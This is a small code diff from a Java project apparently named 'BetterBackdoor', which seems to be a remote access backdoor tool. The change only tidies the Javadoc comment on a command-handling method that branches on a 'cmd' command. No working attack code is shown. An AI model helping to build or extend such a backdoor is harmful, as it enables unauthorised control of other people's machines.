@@ -8,9 +8,9 @@ import com.github.thatcherdev.betterbackdoor.backend.FTP;
 public class HandleCommand {
 
 	/**
-	 * Handle command {@link command} given by user.
+	 * Handles command {@link command} given by user.
 	 *
-	 * @param command command given by user.
+	 * @param command command given by user
 	 */
 	public static void handle(String command) {
 		if (command.equals("cmd")) {
